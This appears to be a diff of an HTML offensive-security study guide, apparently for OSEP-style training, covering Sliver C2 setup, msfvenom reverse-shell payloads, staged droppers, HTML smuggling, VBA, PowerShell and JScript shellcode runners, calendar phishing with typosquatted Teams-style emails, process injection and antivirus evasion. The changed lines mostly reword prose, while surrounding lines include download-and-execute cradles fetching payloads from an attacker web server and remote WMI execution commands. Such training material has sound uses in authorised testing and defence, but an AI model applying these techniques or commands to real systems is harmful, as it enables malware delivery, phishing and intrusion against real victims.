@@ -259,9 +259,9 @@
 
 <h3 id="os-language-levels">1.1 Programming Language Levels</h3>
 
-<p>Programming languages range from low-level (assembly, C) to high-level (C#, Python, PowerShell). Low-level languages map closely to hardware instructions — assembly translates directly to CPU opcodes, while C provides thin abstractions over memory and registers. High-level languages prioritize productivity over direct hardware control.</p>
+<p>Programming languages range from low-level (assembly, C) to high-level (C#, Python, PowerShell). Low-level languages map closely to hardware instructions, assembly translates directly to CPU opcodes, while C provides thin abstractions over memory and registers. High-level languages prioritize productivity over direct hardware control.</p>
 
-<p>At the lowest level, every program is a series of opcodes — numerical values the CPU fetches, decodes, and executes. x86 and x64 are the dominant architectures for Windows exploitation. ARM uses a reduced instruction set and is increasingly relevant for mobile and IoT targets.</p>
+<p>At the lowest level, every program is a series of opcodes, numerical values the CPU fetches, decodes, and executes. x86 and x64 are the dominant architectures for Windows exploitation. ARM uses a reduced instruction set and is increasingly relevant for mobile and IoT targets.</p>
 
 <table class="custom-table">
 <thead><tr><th>Level</th><th>Languages</th><th>Characteristics</th></tr></thead>
@@ -276,7 +276,7 @@
 
 <p>Unmanaged code (C, C++) compiles directly to native machine instructions and runs without a runtime intermediary. The developer is responsible for memory allocation and deallocation, which gives full control but introduces risks like buffer overflows and use-after-free vulnerabilities.</p>
 
-<p>Managed code (C#, Java) compiles to intermediate bytecode — Microsoft Intermediate Language (MSIL) for .NET, or Java bytecode for the JVM. A runtime environment (the CLR for .NET, the JRE for Java) handles just-in-time (JIT) compilation, memory management, and type safety. .NET Core extends this model to Linux and macOS.</p>
+<p>Managed code (C#, Java) compiles to intermediate bytecode, Microsoft Intermediate Language (MSIL) for .NET, or Java bytecode for the JVM. A runtime environment (the CLR for .NET, the JRE for Java) handles just-in-time (JIT) compilation, memory management, and type safety. .NET Core extends this model to Linux and macOS.</p>
 
 <table class="custom-table">
 <thead><tr><th>Aspect</th><th>Unmanaged (C/C++)</th><th>Managed (C#/Java)</th></tr></thead>
@@ -291,7 +291,7 @@
 
 <h3 id="os-oop-concepts">1.3 Object-Oriented Programming Concepts</h3>
 
-<p>Offensive .NET tooling and DotNetToJscript payloads rely on object-oriented programming. A <strong>class</strong> is a blueprint that defines fields (variables) and methods (functions). A <strong>constructor</strong> initializes an object when it is instantiated. Access modifiers (<code>public</code>, <code>private</code>) control visibility — private members are inaccessible outside the class, which matters when using reflection to bypass restrictions.</p>
+<p>Offensive .NET tooling and DotNetToJscript payloads rely on object-oriented programming. A <strong>class</strong> is a blueprint that defines fields (variables) and methods (functions). A <strong>constructor</strong> initializes an object when it is instantiated. Access modifiers (<code>public</code>, <code>private</code>) control visibility, private members are inaccessible outside the class, which matters when using reflection to bypass restrictions.</p>
 
 <pre><code class="language-csharp">public class ShellcodeRunner
 {
@@ -343,7 +343,7 @@ sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=[listener-ip] LPORT=[list
 
 <h3 id="os-win32-apis">1.5 Win32 APIs</h3>
 
-<p>The Win32 API is the primary interface between user-mode applications and the Windows operating system. Every offensive technique in this section — shellcode execution, process injection, token manipulation — ultimately calls Win32 API functions exported by system DLLs like <code>kernel32.dll</code>, <code>ntdll.dll</code>, and <code>advapi32.dll</code>.</p>
+<p>The Win32 API is the primary interface between user-mode applications and the Windows operating system. Every offensive technique in this section, shellcode execution, process injection, token manipulation, ultimately calls Win32 API functions exported by system DLLs like <code>kernel32.dll</code>, <code>ntdll.dll</code>, and <code>advapi32.dll</code>.</p>
 
 <p>Each API function has a documented prototype specifying its parameters and return type. Microsoft defines custom data types that map to standard C types. Functions that handle strings come in two variants: an <strong>A suffix</strong> (ANSI/ASCII, e.g., <code>GetUserNameA</code>) and a <strong>W suffix</strong> (Wide/Unicode UTF-16, e.g., <code>GetUserNameW</code>). Modern Windows uses Unicode internally, so W variants are preferred.</p>
 
@@ -405,7 +405,7 @@ Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion"</code></pre>
 
 <h3 id="sliver-server-setup">2.1 Server Setup</h3>
 
-<p>The Sliver server binary manages all operator connections, listeners, and implants. Download the pre-compiled binary from the GitHub releases page and configure the server before connecting any clients. Enabling multiplayer mode is required before any client can connect — without it, the server only accepts local console access.</p>
+<p>The Sliver server binary manages all operator connections, listeners, and implants. Download the pre-compiled binary from the GitHub releases page and configure the server before connecting any clients. Enabling multiplayer mode is required before any client can connect, without it, the server only accepts local console access.</p>
 
 <table class="custom-table">
 <thead><tr><th>Component</th><th>Binary</th><th>Purpose</th></tr></thead>
@@ -478,7 +478,7 @@ http -L [listener-ip] --lport [listener-port]</code></pre>
 
 <h3 id="sliver-payloads">2.3 Payload Generation</h3>
 
-<p>Sliver ships every payload format an operator needs natively &mdash; there is no reason to reach for external shellcode generators. Session implants (<code>generate</code>) call back interactively; beacons (<code>generate beacon</code>) sleep between check-ins for long-lived post-ex. Both can be produced as full executables (self-contained, easy delivery) or as raw shellcode / C# arrays / PowerShell arrays for embedding into custom loaders. XOR-key <code>2</code> is the convention when embedding raw shellcode into custom C# or PowerShell runners.</p>
+<p>Sliver ships every payload format an operator needs natively, there is no reason to reach for external shellcode generators. Session implants (<code>generate</code>) call back interactively; beacons (<code>generate beacon</code>) sleep between check-ins for long-lived post-ex. Both can be produced as full executables (self-contained, easy delivery) or as raw shellcode / C# arrays / PowerShell arrays for embedding into custom loaders. XOR-key <code>2</code> is the convention when embedding raw shellcode into custom C# or PowerShell runners.</p>
 
 <table class="custom-table">
 <thead><tr><th>Format</th><th>Command</th><th>Output</th><th>Use Case</th></tr></thead>
@@ -776,9 +776,9 @@ sliver (SESSION) > jump-wmiexec [target] 'powershell -enc [base64-cradle]'</code
 
 <h3 id="droppers-staged-vs-non-staged-payloads">3.1 Droppers: Staged vs Non-Staged Payloads</h3>
 
-<p>A dropper is malware that delivers and executes a payload on a victim machine. Non-staged payloads embed all shellcode in a single self-contained file. Staged payloads contain only a compact first-stage callback that retrieves the full payload from the C2 server and executes it in memory, reducing the on-disk footprint and detection surface.</p>
+<p>A dropper is malware that delivers and executes a payload on a victim machine. Non-staged payloads embed every byte of the shellcode in one self-contained artifact; staged payloads ship only a small first-stage that pulls the remaining shellcode from an attacker web server and runs it in memory. The stager trades a slightly noisier network profile for a much smaller on-disk footprint, which matters when static scanners are the tighter constraint.</p>
 
-<p>The two main flavors in this section are Meterpreter (msfvenom) shellcode and a downloader stager written in Nim. A non-staged payload embeds all the shellcode in a single self-contained artifact; a staged payload contains only a small first-stage that pulls the remaining shellcode from an attacker web server and executes it in memory.</p>
+<p>Two flavours cover most of the ground: Meterpreter shellcode produced by <code>msfvenom</code>, and a hand-rolled downloader written in Nim.</p>
 
 <table class="custom-table">
 <thead><tr><th>Type</th><th>Characteristics</th><th>Delivery Format</th></tr></thead>
@@ -864,7 +864,7 @@ file stager.exe</code></pre>
 
 <h3 id="html-smuggling">3.2 HTML Smuggling</h3>
 
-<p>HTML smuggling uses JavaScript in a browser page to reconstruct and automatically download a file without the file ever transiting through network security controls as a recognizable attachment. The technique leverages the HTML5 anchor tag <code>download</code> attribute and the <code>Blob</code> API to assemble a file from an in-page Base64 string and trigger a download silently when the page loads.</p>
+<p>HTML smuggling uses JavaScript in a browser page to reconstruct and automatically download a file without the file ever transiting network security controls as a recognizable attachment. The technique abuses the HTML5 anchor <code>download</code> attribute and the <code>Blob</code> API to assemble a file from an in-page Base64 string and trigger the download silently when the page loads.</p>
 
 <p>The key advantage is that the payload bytes are stored inside the HTML page itself, encoded as Base64. The browser decodes and assembles the file locally, so proxies and mail gateways never see the binary content pass over the wire in its executable form.</p>
 
@@ -1070,7 +1070,7 @@ End Function</code></pre>
 
 <p>The VBA shellcode runner allocates a region of executable memory using <code>VirtualAlloc</code>, writes shellcode byte-by-byte into it with <code>RtlMoveMemory</code>, then creates a new thread at that address via <code>CreateThread</code>. The shellcode runs inside the Word process's memory space with no file written to disk. The downside is that closing Word kills the shell.</p>
 
-<p>Shellcode for the VBA runner is generated in <code>vbapplication</code> format so msfvenom outputs a ready-to-paste VBA byte array. The <code>EXITFUNC=thread</code> option is critical — it tells the shellcode to exit the current thread rather than the entire process (Word) when finished.</p>
+<p>Shellcode for the VBA runner is generated in <code>vbapplication</code> format so msfvenom outputs a ready-to-paste VBA byte array. The <code>EXITFUNC=thread</code> option is critical, it tells the shellcode to exit the current thread rather than the entire process (Word) when finished.</p>
 
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
@@ -1254,9 +1254,9 @@ $Assemblies |
 
 <h3 id="powershell-shellcode-runner-delegatetype-reflection">3.8 PowerShell Shellcode Runner (DelegateType Reflection)</h3>
 
-<p>Resolving the API address with <code>LookupFunc</code> is only half the solution. The runtime also needs to know the function's argument types and calling convention. This is provided through a <code>DelegateType</code> — a .NET type that acts as the function prototype. Since PowerShell has no <code>delegate</code> keyword, the delegate type must be constructed entirely through Reflection using <code>AssemblyBuilder</code>, <code>ModuleBuilder</code>, <code>TypeBuilder</code>, <code>DefineConstructor</code>, and <code>DefineMethod</code>.</p>
+<p>Resolving the API address with <code>LookupFunc</code> is only half the solution. The runtime also needs to know the function's argument types and calling convention. This is provided through a <code>DelegateType</code>, a .NET type that acts as the function prototype. Since PowerShell has no <code>delegate</code> keyword, the delegate type must be constructed entirely through Reflection using <code>AssemblyBuilder</code>, <code>ModuleBuilder</code>, <code>TypeBuilder</code>, <code>DefineConstructor</code>, and <code>DefineMethod</code>.</p>
 
-<p>The <code>getDelegateType</code> helper builds an in-memory assembly, defines a <code>MulticastDelegate</code>-derived type, and returns it as a .NET type. This type is then paired with the resolved API address via <code>Marshal.GetDelegateForFunctionPointer</code> to produce a callable delegate — all without touching disk.</p>
+<p>The <code>getDelegateType</code> helper builds an in-memory assembly, defines a <code>MulticastDelegate</code>-derived type, and returns it as a .NET type. This type is then paired with the resolved API address via <code>Marshal.GetDelegateForFunctionPointer</code> to produce a callable delegate, all without touching disk.</p>
 
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
@@ -1417,7 +1417,7 @@ End Sub</code></pre>
 
 <p>When a victim enables macros, they expect to see "decrypted" content. The AutoText technique maintains the deception by replacing the fake encrypted text with convincing content (such as a resume or invoice) at the moment macros execute. This keeps the victim engaged with the document long enough for the reverse shell to connect.</p>
 
-<p>The technique uses Word's AutoText gallery (Quick Parts) to store the replacement content. The VBA macro selects and deletes the fake text, then inserts the stored AutoText entry. The replacement happens instantly from the victim's perspective — the document appears to decrypt. the initial fake encrypted document, and the before-and-after result.</p>
+<p>The technique uses Word's AutoText gallery (Quick Parts) to store the replacement content. The VBA macro selects and deletes the fake text, then inserts the stored AutoText entry. The replacement happens instantly from the victim's perspective, the document appears to decrypt. the initial fake encrypted document, and the before-and-after result.</p>
 
 <figure><img src="/assets/images/osep/fake-encrypted-doc.png" alt="Fake RSA encrypted document"></figure>
 
@@ -1493,7 +1493,7 @@ End Sub</code></pre>
 
 <h3 id="phishing-calendars-ics-standard">4.1 The iCalendar (ICS) Standard</h3>
 
-<p>The iCalendar (ICS) format, defined in RFC 5545, is a plain-text standard for exchanging calendar event data across platforms including Google Calendar, Microsoft Outlook, and Apple Calendar. An ICS file is organized into components — <code>VCALENDAR</code>, <code>VEVENT</code>, <code>VTODO</code>, <code>VJOURNAL</code> — each containing key-value property pairs. Adversaries weaponize ICS invitations because they frequently bypass email filters that inspect attachments rather than calendar metadata.</p>
+<p>The iCalendar (ICS) format, defined in RFC 5545, is a plain-text standard for exchanging calendar event data across platforms including Google Calendar, Microsoft Outlook, and Apple Calendar. An ICS file is organized into components, <code>VCALENDAR</code>, <code>VEVENT</code>, <code>VTODO</code>, <code>VJOURNAL</code>, each containing key-value property pairs. Adversaries weaponize ICS invitations because they frequently bypass email filters that inspect attachments rather than calendar metadata.</p>
 
 <p>The fields most commonly manipulated in phishing campaigns are shown below.</p>
 
@@ -1566,7 +1566,7 @@ END:VCALENDAR</code></pre>
 
 <h3 id="phishing-calendars-crafting">4.2 Crafting the Full Calendar Phishing Email</h3>
 
-<p>To increase credibility, the email body should mimic a legitimate Microsoft Teams meeting invitation. Copying the Teams HTML layout and replacing only the href links with attacker-controlled URLs produces an email that passes visual inspection. In a real engagement, the phishing domain should use typosquatting — substituting characters such as "1" for "l" or "0" for "o" — to make the URL appear valid at a glance.</p>
+<p>To increase credibility, the email body should mimic a legitimate Microsoft Teams meeting invitation. Copying the Teams HTML layout and replacing only the href links with attacker-controlled URLs produces an email that passes visual inspection. In a real engagement, the phishing domain should use typosquatting, substituting characters such as "1" for "l" or "0" for "o", to make the URL appear valid at a glance.</p>
 
 <p>The enhanced Teams-style HTML template uses <code>[ATTACKER_URL]</code> placeholders on every href so a single search-and-replace populates all links consistently. Save this as <code>email.html</code> before sending.</p>
 
@@ -1825,13 +1825,13 @@ crackmapexec smb [target-ip] -u [user] -p [password] -d [domain]</code></pre>
 
 <h2 id="client-side-jscript">5. Client-Side Code Execution with JScript</h2>
 
-<p>JScript is Microsoft's dialect of JavaScript executed outside the browser through the Windows Script Host (WSH). Because it runs outside the browser sandbox, it bypasses all browser security restrictions and can interact with ActiveX and Win32 APIs — making it a highly effective client-side phishing vector. Real-world malware families including TrickBot and Emotet have used JScript-based droppers. JScript droppers can progress from basic execution to fully in-memory shellcode runners backed by C# and Sliver C2.</p>
+<p>JScript is Microsoft's dialect of JavaScript executed outside the browser through the Windows Script Host (WSH). Running outside the browser sandbox, it reaches ActiveX and Win32 APIs directly, hence its long track record as a client-side phishing vector. TrickBot and Emotet both shipped JScript droppers. From a basic <code>wscript.exe</code> one-liner it is a short walk to fully in-memory shellcode runners backed by C# and Sliver C2.</p>
 
 <h3 id="jscript-windows-execution">5.1 JScript Execution on Windows</h3>
 
-<p>Windows associates file extensions with default applications. The <code>.ps1</code> extension opens in Notepad by default, meaning double-clicking a PowerShell script will not execute it. The <code>.js</code> extension, however, is associated with <strong>Windows-Based Script Host (wscript.exe)</strong> — double-clicking a <code>.js</code> file executes it immediately.</p>
+<p>Windows associates file extensions with default applications. The <code>.ps1</code> extension opens in Notepad by default, meaning double-clicking a PowerShell script will not execute it. The <code>.js</code> extension, however, is associated with <strong>Windows-Based Script Host (wscript.exe)</strong>, double-clicking a <code>.js</code> file executes it immediately.</p>
 
-<p>JScript outside the browser can leverage <strong>ActiveX</strong> objects and the WSH engine. The <code>ActiveXObject</code> constructor instantiates COM objects, while <code>WScript.Shell</code> provides shell execution capability.</p>
+<p>JScript outside the browser reaches directly into <strong>ActiveX</strong> objects and the WSH engine. The <code>ActiveXObject</code> constructor instantiates COM objects; <code>WScript.Shell</code> gives shell execution.</p>
 
 <table class="custom-table">
 <thead><tr><th>File Extension</th><th>Default Handler</th><th>Executes on Double-Click?</th><th>Attack Use</th></tr></thead>
@@ -1924,7 +1924,7 @@ sliver ([SESSION]) > whoami</code></pre>
 
 <h3 id="dnj-dotnet-setup">5.3 Environment Setup: Visual Studio and Samba Share</h3>
 
-<p>C# development requires Visual Studio on a Windows machine. To preserve code between VM reverts, set up a Samba share on Kali and save Visual Studio projects to it. Use <strong>Release mode</strong> rather than Debug when compiling — debug symbols can trigger security software.</p>
+<p>C# development requires Visual Studio on a Windows machine. To preserve code between VM reverts, set up a Samba share on Kali and save Visual Studio projects to it. Use <strong>Release mode</strong> rather than Debug when compiling, debug symbols can trigger security software.</p>
 
 <p>Create projects as <strong>Console App (.NET Framework)</strong> for executables or <strong>Class Library (.NET Framework)</strong> for DLLs. Always set the CPU architecture to <strong>x64</strong> in Configuration Manager when targeting 64-bit systems.</p>
 
@@ -1959,7 +1959,7 @@ chmod -R 777 /home/kali/data</code></pre>
 
 <h3 id="dnj-win32-csharp">5.4 Win32 API Calls from C# (P/Invoke)</h3>
 
-<p>C# can import Win32 APIs from native DLLs using the <code>[DllImport]</code> attribute via the P/Invoke mechanism. Unlike the PowerShell reflection approach, C# assemblies are compiled before delivery and executed entirely in memory — no temporary source files or <code>Add-Type</code> compilation on the target. The <code>System.Runtime.InteropServices</code> namespace is required for <code>DllImport</code>, and <code>System.Diagnostics</code> is needed for process-related APIs.</p>
+<p>C# can import Win32 APIs from native DLLs using the <code>[DllImport]</code> attribute via the P/Invoke mechanism. Unlike the PowerShell reflection approach, C# assemblies are compiled before delivery and executed entirely in memory, no temporary source files or <code>Add-Type</code> compilation on the target. The <code>System.Runtime.InteropServices</code> namespace is required for <code>DllImport</code>, and <code>System.Diagnostics</code> is needed for process-related APIs.</p>
 
 <p>C data types must be translated to their C# equivalents. Use <a href="http://pinvoke.net" target="_blank">pinvoke.net</a> as a reference for correct signatures. The shellcode runner requires three kernel32 functions: <code>VirtualAlloc</code>, <code>CreateThread</code>, and <code>WaitForSingleObject</code>.</p>
 
@@ -2072,7 +2072,7 @@ sliver ([SESSION]) > whoami</code></pre>
 
 <h3 id="dnj-dotnetojscript">5.6 DotNetToJscript</h3>
 
-<p>DotNetToJscript (by James Forshaw) serializes a compiled C# assembly into a Base64 blob and wraps it in JScript that deserializes and executes it at runtime — entirely in memory. The tool produces a self-contained <code>.js</code> file containing three helper functions (<code>setversion</code>, <code>debug</code>, <code>base64ToStream</code>) and the deserialization logic using <code>BinaryFormatter.Deserialize_2</code> and <code>DynamicInvoke</code>.</p>
+<p>DotNetToJscript (by James Forshaw) serializes a compiled C# assembly into a Base64 blob and wraps it in JScript that deserializes and executes it at runtime, entirely in memory. The tool produces a self-contained <code>.js</code> file containing three helper functions (<code>setversion</code>, <code>debug</code>, <code>base64ToStream</code>) and the deserialization logic using <code>BinaryFormatter.Deserialize_2</code> and <code>DynamicInvoke</code>.</p>
 
 <p>The target C# class must be decorated with <code>[ComVisible(true)]</code> and its entry point placed in the class constructor. DotNetToJscript sets the .NET runtime version via the <code>COMPLUS_Version</code> environment variable before loading the assembly. On newer .NET versions, comment out the legacy version check at line 154 of <code>Program.cs</code> in the DotNetToJscript project before compiling.</p>
 
@@ -2376,7 +2376,7 @@ sliver ([SESSION]) > getpid</code></pre>
 
 <h3 id="ps-dotnet-relationship">6.1 PowerShell and .NET — The Add-Type Problem</h3>
 
-<p>PowerShell relies on the .NET framework for runtime code execution. The most common approach is <code>Add-Type</code>, which invokes the Visual C# Command-Line Compiler to compile C# source code at runtime. While this avoids writing shellcode to disk, the compiler writes both the <code>.cs</code> source file and the resulting <code>.dll</code> assembly to the filesystem before loading them into the process — creating detectable artifacts.</p>
+<p>PowerShell relies on the .NET framework for runtime code execution. The most common approach is <code>Add-Type</code>, which invokes the Visual C# Command-Line Compiler to compile C# source code at runtime. While this avoids writing shellcode to disk, the compiler writes both the <code>.cs</code> source file and the resulting <code>.dll</code> assembly to the filesystem before loading them into the process, creating detectable artifacts.</p>
 
 <p>These temporary files can be observed in Process Monitor as <code>CreateFile</code>, <code>WriteFile</code>, and <code>CloseFile</code> events for randomly named <code>.cs</code> and <code>.dll</code> files. The compiled assembly is then listed under <code>[appdomain]::currentdomain.getassemblies()</code>. AV engines can scan these disk writes and flag them before execution completes.</p>
 
@@ -2389,7 +2389,7 @@ sliver ([SESSION]) > getpid</code></pre>
 </tbody>
 </table>
 
-<p>The goal of reflective PowerShell is to create assemblies entirely in memory, bypassing the compilation step and eliminating all disk artifacts. This requires leveraging already-loaded .NET assemblies and the reflection API.</p>
+<p>The goal of reflective PowerShell is to create assemblies entirely in memory, bypassing the compilation step and eliminating all disk artifacts. It reuses already-loaded .NET assemblies through the reflection API.</p>
 
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
@@ -2424,7 +2424,7 @@ $Assemblies | ForEach-Object {
 
 <h3 id="unsafe-native-methods">6.2 Leveraging UnsafeNativeMethods</h3>
 
-<p><code>Microsoft.Win32.UnsafeNativeMethods</code> inside <code>System.dll</code> contains internal static implementations of <code>GetModuleHandle</code> and <code>GetProcAddress</code>. These methods are not publicly accessible — they are marked internal — so they cannot be called directly from PowerShell or C#. The solution is to use .NET reflection to obtain references to them at runtime and invoke them indirectly through the <code>Invoke</code> method.</p>
+<p><code>Microsoft.Win32.UnsafeNativeMethods</code> inside <code>System.dll</code> contains internal static implementations of <code>GetModuleHandle</code> and <code>GetProcAddress</code>. Both methods are marked <code>internal</code>, which makes them unreachable through the normal type system from PowerShell or C#. The workaround is .NET reflection: obtain references to them at runtime and invoke them indirectly through the <code>Invoke</code> method.</p>
 
 <p><code>GetModuleHandle</code> returns the base memory address of a DLL that is already loaded into the process. <code>GetProcAddress</code> takes that base address and a function name string and returns the absolute memory address of the target function. Together, these two APIs can resolve the address of any Win32 function dynamically without <code>Add-Type</code> or any disk write.</p>
 
@@ -2488,7 +2488,7 @@ LookupFunc user32.dll MessageBoxA
 
 <h3 id="delegatetype-reflection">6.3 DelegateType Reflection</h3>
 
-<p>Resolving a Win32 API address is only half the problem — calling the function also requires a delegate type that defines the function's signature (parameter types and return type). In C#, this is a <code>delegate</code> declaration compiled at build time. In PowerShell, there is no <code>delegate</code> keyword, so the delegate type must be constructed entirely at runtime using the <code>System.Reflection.Emit</code> namespace.</p>
+<p>Resolving a Win32 API address is only half the problem, calling the function also requires a delegate type that defines the function's signature (parameter types and return type). In C#, this is a <code>delegate</code> declaration compiled at build time. In PowerShell, there is no <code>delegate</code> keyword, so the delegate type must be constructed entirely at runtime using the <code>System.Reflection.Emit</code> namespace.</p>
 
 <p>The process builds a synthetic in-memory assembly containing a single module, a custom type that inherits <code>MulticastDelegate</code>, and an <code>Invoke</code> method that matches the target API's signature. Once the type is created with <code>CreateType()</code>, it is passed alongside the resolved function address to <code>Marshal.GetDelegateForFunctionPointer</code>, which returns a callable .NET delegate backed by the raw Win32 function pointer.</p>
 
@@ -2553,7 +2553,7 @@ $MyFunction.Invoke([IntPtr]::Zero, "Test", "Reflective PS", 0)</code></pre>
 
 <p>With <code>LookupFunc</code> and <code>getDelegateType</code> available, the full shellcode runner replaces every <code>Add-Type</code> P/Invoke declaration with an inline call to resolve and bind each Win32 API. The three APIs needed are <code>VirtualAlloc</code> (allocate RWX memory), <code>CreateThread</code> (spawn a thread at the shellcode buffer), and <code>WaitForSingleObject</code> (block the process from exiting). The shellcode byte array is copied into the allocated buffer with the .NET <code>Marshal.Copy</code> method, which requires no additional Win32 resolution.</p>
 
-<p>Generate shellcode before constructing the runner via <code>sliver > generate --format shellcode</code> for a native Sliver implant. The bytes slot directly into the <code>$buf</code> array. No file touches disk during execution — Process Monitor will show no <code>.cs</code> or <code>.dll</code> write events.</p>
+<p>Generate shellcode before constructing the runner via <code>sliver > generate --format shellcode</code> for a native Sliver implant. The bytes slot directly into the <code>$buf</code> array. No file touches disk during execution, Process Monitor will show no <code>.cs</code> or <code>.dll</code> write events.</p>
 
 <table class="custom-table">
 <thead><tr><th>Win32 API</th><th>DLL</th><th>Delegate Parameter Types</th><th>Return Type</th></tr></thead>
@@ -2655,7 +2655,7 @@ python3 -m http.server 80 --directory /var/www/html</code></pre>
 
 <p>A Word macro can deliver the reflective shellcode runner without any disk artifact by using a download cradle that fetches and executes the PowerShell script entirely in memory. The VBA macro calls <code>Shell</code> to spawn PowerShell with a <code>DownloadString</code> + <code>IEX</code> one-liner. The <code>Document_Open</code> and <code>AutoOpen</code> event handlers ensure execution occurs as soon as the document is opened and macros are enabled.</p>
 
-<p>The key difference from earlier macro-based runners is the hosted script content. The <code>run.ps1</code> file served from the attacker's web server now contains the full reflective runner (with <code>LookupFunc</code>, <code>getDelegateType</code>, and the shellcode bytes) instead of an <code>Add-Type</code> based runner. The macro itself does not change — only the hosted payload changes.</p>
+<p>The key difference from earlier macro-based runners is the hosted script content. The <code>run.ps1</code> file served from the attacker's web server now contains the full reflective runner (with <code>LookupFunc</code>, <code>getDelegateType</code>, and the shellcode bytes) instead of an <code>Add-Type</code> based runner. The macro itself does not change, only the hosted payload changes.</p>
 
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
@@ -2697,7 +2697,7 @@ sliver ([session-name]) > info</code></pre>
 
 <p>Rather than using <code>Add-Type</code> to compile C# at runtime (which writes to disk), a pre-compiled C# Class Library DLL can be downloaded as a byte array and loaded directly into memory using <code>System.Reflection.Assembly::Load</code>. This approach separates compilation (done once on the attacker's machine) from execution (done entirely in memory on the target). The DLL exposes a <code>public static void runner()</code> method that contains the shellcode runner logic.</p>
 
-<p>The C# Class Library project uses standard <code>DllImport</code> declarations for <code>VirtualAlloc</code>, <code>CreateThread</code>, and <code>WaitForSingleObject</code>. After compilation, the resulting <code>.dll</code> is served from the attacker's web server. PowerShell downloads it as a byte array with <code>DownloadData</code>, loads it with <code>Assembly::Load</code>, and invokes the runner method via reflection — the DLL never touches the target's disk.</p>
+<p>The C# Class Library project uses standard <code>DllImport</code> declarations for <code>VirtualAlloc</code>, <code>CreateThread</code>, and <code>WaitForSingleObject</code>. After compilation, the resulting <code>.dll</code> is served from the attacker's web server. PowerShell downloads it as a byte array with <code>DownloadData</code>, loads it with <code>Assembly::Load</code>, and invokes the runner method via reflection, the DLL never touches the target's disk.</p>
 
 <table class="custom-table">
 <thead><tr><th>Method</th><th>Disk Write?</th><th>How DLL Is Loaded</th><th>Use Case</th></tr></thead>
@@ -2818,7 +2818,7 @@ sliver ([session-name]) > info
 
 <h3 id="process-injection-theory">7.1 Process Injection Theory</h3>
 <p>Process injection allows an attacker to execute arbitrary code inside a remote process. The primary motivation is persistence and evasion: if the initial loader (a Word macro, JScript, or PowerShell runner) is closed, the implant survives inside the target process. A secondary benefit is that network traffic appears to originate from a legitimate host process such as <code>explorer.exe</code>.</p>
-<p>Windows enforces process isolation through virtual memory spaces, but the Win32 API exposes a set of functions that intentionally cross those boundaries. Access is gated by process Security Descriptors and Integrity Levels — a Medium Integrity process can inject into another Medium or lower process, but cannot inject into a High Integrity process without first elevating.</p>
+<p>Windows enforces process isolation through virtual memory spaces, but the Win32 API exposes a set of functions that intentionally cross those boundaries. Access is gated by process Security Descriptors and Integrity Levels, a Medium Integrity process can inject into another Medium or lower process, but cannot inject into a High Integrity process without first elevating.</p>
 
 <table class="custom-table">
 <thead><tr><th>Win32 API</th><th>DLL</th><th>Purpose in Injection Chain</th></tr></thead>
@@ -2940,7 +2940,7 @@ meterpreter &gt; sysinfo</code></pre>
 </ul>
 
 <h3 id="dll-injection">7.3 DLL Injection</h3>
-<p>Instead of raw shellcode, DLL injection forces the remote process to load an unmanaged DLL via <code>LoadLibraryA</code>. The trick is that <code>LoadLibraryA</code> cannot be called directly on a remote process, but its address inside the remote process is the same as in the current process (native DLLs share base addresses). Passing <code>LoadLibraryA</code> as the start address of a <code>CreateRemoteThread</code> call — and the DLL path as the argument — causes the remote process to load the DLL itself.</p>
+<p>Instead of raw shellcode, DLL injection forces the remote process to load an unmanaged DLL via <code>LoadLibraryA</code>. The trick is that <code>LoadLibraryA</code> cannot be called directly on a remote process, but its address inside the remote process is the same as in the current process (native DLLs share base addresses). Passing <code>LoadLibraryA</code> as the start address of a <code>CreateRemoteThread</code> call, and the DLL path as the argument, causes the remote process to load the DLL itself.</p>
 <p>The malicious DLL places its shellcode inside the <code>DLL_PROCESS_ATTACH</code> case of <code>DllMain</code>. When <code>LoadLibrary</code> loads the DLL, it calls <code>DllMain</code>, which fires the shellcode automatically. The DLL must be unmanaged (C/C++); managed C# DLLs cannot be loaded this way. This technique writes the DLL to disk, which is its main operational weakness.</p>
 
 <table class="custom-table">
@@ -3255,7 +3255,7 @@ meterpreter &gt; ps -S svchost</code></pre>
 </ul>
 
 <h3 id="sliver-migration-and-shellcode-injection">7.6 Sliver Migration and Shellcode Injection</h3>
-<p>Sliver provides three built-in mechanisms for process migration that map directly to the techniques above. The <code>migrate</code> command handles token stealing and implant relocation in one step. The <code>execute-shellcode</code> command injects raw shellcode bytes into an existing process — useful when the target architecture requires an explicit 32-bit payload. The <code>hollow</code> command wraps process hollowing and is the recommended approach when AV is active.</p>
+<p>Sliver provides three built-in mechanisms for process migration that map directly to the techniques above. The <code>migrate</code> command handles token stealing and implant relocation in one step. The <code>execute-shellcode</code> command injects raw shellcode bytes into an existing process, useful when the target architecture requires an explicit 32-bit payload. The <code>hollow</code> command wraps process hollowing and is the recommended approach when AV is active.</p>
 <p>A common pattern is to first spawn a sacrificial process (such as notepad.exe), then inject into it rather than into an already-running process to avoid disturbing application state. For stability, target explorer.exe; for evasion, target svchost.exe via hollowing.</p>
 
 <table class="custom-table">
@@ -3309,7 +3309,7 @@ sliver ([session]) > whoami</code></pre>
 <p>Modern antivirus software operates at multiple detection layers. Most products implement <strong>signature-based detection</strong> using MD5/SHA-1 hashes or unique byte sequences found in known-malicious files, and <strong>heuristic/behavioral detection</strong> that simulates file execution in a sandboxed environment. A newer cloud AI layer supplements these on endpoints, but endpoint performance constraints place practical limits on how deep any emulation engine can go.</p>
 
 <figure><img src="/assets/images/osep/avira-realtime-off.png" alt="Disabling Avira real-time scanning for testing"></figure>
-<p>Understanding which detection layer is firing — signature vs. heuristic — determines which bypass technique to apply. Signature bypasses address static byte patterns. Heuristic bypasses fool the emulation engine into thinking the binary is benign before any malicious action executes.</p>
+<p>Understanding which detection layer is firing, signature vs. heuristic, determines which bypass technique to apply. Signature bypasses address static byte patterns. Heuristic bypasses fool the emulation engine into thinking the binary is benign before any malicious action executes.</p>
 
 <table class="custom-table">
 <thead><tr><th>Detection Method</th><th>Mechanism</th><th>Bypass Strategy</th></tr></thead>
@@ -3335,7 +3335,7 @@ sliver ([session]) > whoami</code></pre>
 
 <h3 id="locating-signatures">8.2 Locating Signatures in Files</h3>
 <p>Binary splitting isolates the exact byte offset responsible for triggering a signature, without requiring you to reverse-engineer the AV engine. The <strong>Find-AVSignature</strong> PowerShell script splits a binary into segments of configurable size and writes them to disk. ClamAV then scans the segments to determine which range contains the offending bytes. Each iteration narrows the range until the exact byte is identified.</p>
